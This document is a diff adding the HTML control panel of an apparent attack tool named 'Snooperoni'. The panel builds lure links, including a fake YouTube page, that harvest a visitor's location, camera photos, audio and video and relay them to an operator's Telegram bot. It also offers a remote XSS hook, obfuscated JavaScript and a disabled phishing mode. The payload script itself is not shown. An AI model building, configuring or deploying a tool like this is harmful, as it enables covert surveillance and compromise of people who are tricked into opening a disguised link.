@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SNOOPERONI</title>
+    <!--icon-->
+    <link rel="icon" type="image/x-icon" href="./icon.ico">
+    <!--styles-->
+    <link rel="stylesheet" href="./control.css">
+
+    <!--bootstrap-->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <!--google fonts-->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Lobster&family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <!--bootstrap icon-->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+
+</head>
+<body>
+    <div class="side"></div>
+    <div class="main">
+        <div class="card mainCard">
+            <div class="card-body">
+                <!--title-->
+                <h1 class="title"><img class="pizzaIcon" src="./icon.png">Sn<span class="titleOO">oo</span>pe<span class="titleO1">ro</span><span class="title02">ni</span></h1>
+                <hr>
+                <!--token input and options-->
+                <div class="input-group mb-3">
+                    <input type="password" id="botTokenInput"  class="form-control normal_input" placeholder="Enter Telegram Bot token .." aria-label="Username" aria-describedby="basic-addon1" data-bs-toggle="tooltip" data-bs-placement="top" title="Enter Telegram Bot Token">
+                    <!--show hide bot token-->
+                    <span id="showHidetokenButton" class="input-group-text btn-warning spanButtons" data-bs-toggle="tooltip" data-bs-placement="top" title="Show/hide Token"><i class="bi bi-eye-fill"></i></span>
+                    <!--refresh chat ID-->
+                    <span id="refreshClientButton" class="input-group-text btn-warning spanButtons" data-bs-toggle="collapse" data-bs-target="#chatIDAccordionContent" ><i class="bi bi-arrow-clockwise"></i></span>
+                    <!--start setting chat id-->
+                    <span id="startButton" class="input-group-text btn-warning spanButtons"  data-bs-toggle="collapse" data-bs-target="#helpAccordionContent">Start</span>
+                </div>
+
+                <!--save and clear token (localstorage)-->
+                <div class="input-group mb-3 justify-content-between d-flex align-items-center">
+                    <div class="form-check form-switch saveTokenSwitch">
+                        <input class="form-check-input btn-warning" type="checkbox" id="saveTokenCheckbox" data-bs-toggle="tooltip" data-bs-placement="top" title="Save Token locally" >
+                        <label class="form-check-label" id="saveTokenLabel" for="flexSwitchCheckDefault">Save Token (local storage)</label>
+                    </div>
+                    <span id="clearSavedDatabutton" class="clearStorageButton" data-bs-toggle="tooltip" data-bs-placement="top" title="Clear any Stored value" ><i class="bi bi-x-circle"></i></span>
+                </div>
+                <!--base url input-->
+                <div class="input-group mb-1">
+                    <input type="text" id="baseUrlInput"  class="form-control normal_input" placeholder="Enter Base URL .." aria-label="Username" aria-describedby="basic-addon1" data-bs-toggle="tooltip" data-bs-placement="top" title="Enter Base URL">
+                    <select class="normalSelect urlSelect" name="urlSelect" id="urlSelect">
+                        <option selected>Select</option>
+                        <option value="test" >Test</option>
+                        <option value="yt">Youtube (Fake)</option>
+                        <option value="clear">Clear URL</option>
+                    </select>
+                </div>
+                <br>
+
+                <!--show options-->
+                            
+                <select class="form-select normalSelect" id="optionSelector" aria-label="Default select example" >
+                    <option selected value="--">Select an Option</option>
+                    <option value="InformationGathering" >Information gathering</option>
+                    <option value="Phishing" disabled>Phishing (Not Available)</option>
+                    <option value="RemoteXSS">Remote XSS </option>
+                </select>
+                <hr>
+                
+
+                <!--help accordion-->
+                <div class="accordion" id="helpAccordion">
+                    <div class="accordion-item normalAccordion-item">
+                        <h2 class="accordion-header" id="headingTwo">
+                        <button class="accordion-button collapsed normal-Accordion " type="button" data-bs-toggle="collapse" data-bs-target="#helpAccordionContent" aria-expanded="false" aria-controls="collapseTwo">
+                         BOT :  <span class="selectedBot" id="selectedBot"> -- </span>
+                        </button>
+                        </h2>
+                        <div id="helpAccordionContent" class="accordion-collapse subCard collapse accordionContent" aria-labelledby="headingTwo" data-bs-parent="#helpAccordion">
+                        <div class="accordion-body subCard" id="helpAccordionBody">
+                        </div>
+                        </div>
+                    </div>
+                </div>
+                <br>
+                <!--chat id List accordion-->
+                <div class="accordion" id="chatIDAccordion">
+                    <div class="accordion-item normalAccordion-item">
+                        <h2 class="accordion-header" id="headingTwo">
+                        <button class="accordion-button collapsed normal-Accordion " type="button" data-bs-toggle="collapse" data-bs-target="#chatIDAccordionContent" aria-expanded="false" aria-controls="collapseTwo">
+                        CHAT ID : <span class="selectedChatId" id="selectedChatId"> -- </span> 
+                        </button>
+                        </h2>
+                        <div id="chatIDAccordionContent" class="accordion-collapse subCard collapse accordionContent" aria-labelledby="headingTwo" data-bs-parent="#chatIDAccordion">
+                        <div class="accordion-body subCard" >
+                            <ul class="list-group" id="chatIDAccordionBody"></ul>
+                        </div>
+                        </div>
+                    </div>
+                </div>
+
+                <hr>
+                
+
+                <!--more options accordion-->
+                <div class="accordion" id="optionsAccordion">
+                    <div class="accordion-item normalAccordion-item">
+                        <h2 class="accordion-header" id="headingTwo">
+                        <button class="accordion-button collapsed normal-Accordion " type="button" data-bs-toggle="collapse" data-bs-target="#optionsContent" aria-expanded="false" aria-controls="collapseTwo" id="optionAccordionButton">
+                        OPTION : <span class="selectedOption" id="selectedOption"> -- </span>
+                        </button>
+                        </h2>
+                        <div id="optionsContent" class="accordion-collapse subCard collapse accordionContent" aria-labelledby="headingTwo" data-bs-parent="#optionsAccordion">
+                        <div class="accordion-body subCard" >
+                                    <input class="form-check-input" type="checkbox" value="" id="obfuscateJsCheckbox">
+                                    <label class="form-check-label" for="obfuscateJsCheckbox"> use Obfuscated JS</label>
+                                    <br><br>
+                                    <div class="input-group mb-3">
+                                    <input class="form-control normal_input" type="text" placeholder="Youtube Video ID (optional)" id="youtubeVideoID">
+                                    
+                                    <select class="normalSelect urlSelect" name="youtubeIDSelect" id="youtubeIDSelect">
+                                        <option selected>Select</option>
+                                        <option value="RNuHMQtDl80" >Thor Infinity WAR</option>
+                                        <option value="S1Ypk4xnnLk">Dark</option>
+                                        <option value="nD0M09d8rH4">Die Gedanken</option>
+                                        <option value="clear">Clear ID</option>
+                                    </select>
+
+                                    </div>
+                                    
+                            <!--information gathering option-->
+                                <div id="InformationGathering" class="optionsDiv">
+                                    
+                                    <hr>
+                                    <p>Addons : </p>
+                                    <hr>
+                                    <input class="form-check-input" type="checkbox"  id="basicCheckbox" checked>
+                                    <label class="form-check-label" for="basicCheckbox"> Basic</label>
+                                    <br>
+                                    <input class="form-check-input" type="checkbox" value="" id="locationCheckbox">
+                                    <label class="form-check-label" for="locationCheckbox"> Location</label>
+                                    <br>
+                                    <input class="form-check-input" type="checkbox" value="" id="cameraCheckbox">
+                                    <label class="form-check-label" for="cameraCheckbox">Photo</label>
+                                    <br>
+                                    <input class="form-check-input" type="checkbox" value="" id="audioCheckbox">
+                                    <label class="form-check-label" for="audioCheckbox">Audio</label>
+                                    <br>
+                                    <input class="form-check-input" type="checkbox" value="" id="VideoCheckbox">
+                                    <label class="form-check-label" for="VideoCheckbox">Video</label>  
+                                    
+
+                                </div>
+
+
+                            <!--phishin option-->
+                                <div id="Phishing" class="optionsDiv">
+                                        <p>phishing options Not Available</p>
+                                </div>
+
+                            <!--phishin option-->
+                                <div id="RemoteXSS" class="optionsDiv">
+                                    <br>
+                                        <label class="form-check-label" for="pollingIntervalInput">Polling Interval : </label>
+                                        <input class="normal_input pollingInput"  min="1" max="100" type="number" value="1" id="pollingIntervalInput">
+
+                                </div>
+                            
+                        </div>
+                        </div>
+                    </div>
+                </div>
+
+
+                <br>
+                
+                <button type="button" class="btn btn-warning normal-button" data-bs-toggle="modal" data-bs-target="#generateResultModal" id="generateButton">Generate</button>
+            <hr>
+            <a href="./help.html"><i class="bi bi-question-circle-fill helpButton"></i></a>
+            </div>
+        </div>
+    </div>
+    <div class="side"></div>
+
+
+    <!--generated URL/Generate Error Modal-->
+    <div class="modal fade " id="generateResultModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog ">
+        <div class="modal-content myModal">
+        <div class="modal-body">
+            <button type="button" class="btn-close closeModalButton" data-bs-dismiss="modal" aria-label="Close"></button><br>
+            
+            <!--url generated-->
+            <div id="urlGeneratedDiv">
+                <h3 class="GnerateModalHeading">URL Generated</h3>
+            
+                <img src="./kitten2.png" class="d-flex justify-content-center myModalImage">
+                <br>
+                <hr>
+                <label for="queryStringInput" class="form-label">Website URL : </label>
+                <div class="input-group mb-3">
+                    <input type="text" class="form-control normal_input" placeholder="Recipient's username" id="queryStringInput" aria-label="Recipient's username" aria-describedby="basic-addon2">
+                    <span class="input-group-text btn-warning copyButton" id="shortURLLinkButton"><i class="bi bi-arrows-angle-contract"></i></span>
+                    <span onclick="copyQueryString()" class="input-group-text btn-warning copyButton" ><i class="bi bi-clipboard"></i></span>
+                </div>
+
+                <label for="hookJsonInput" class="form-label">Hook JSON : </label>
+                <div class="input-group mb-3">
+                    <input type="text" class="form-control normal_input" placeholder="Recipient's username" id="hookJsonInput" aria-label="Recipient's username" aria-describedby="basic-addon2">
+                    <span onclick="copyHookJsonString()" class="input-group-text btn-warning copyButton" ><i class="bi bi-clipboard"></i></span>
+                </div>
+                <div class="alert alert-warning copiedLabel" id="copiedLabel" role="alert">
+                  
+                </div>
+            </div>
+
+            <!--error occured-->
+            <div id="errorOccuredDiv">
+                <h3 class="GnerateModalHeading">Couldnt Generate URL</h3>
+                <hr>
+                <p>Reason : </p>
+                
+                 <ul class="generateURLFailureReasonList" id="generateUrlErrorList"></ul>
+            </div>
+            <hr>
+            <button type="button" class="btn btn-secondary normal-button" data-bs-dismiss="modal">Close</button>
+        </div>
+        </div>
+    </div>
+    </div>
+
+
+    <!--script-->
+    <script src="./control.js"></script>
+
+
+    <!--bootstrap js-->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
+    
+</body>
+</html>
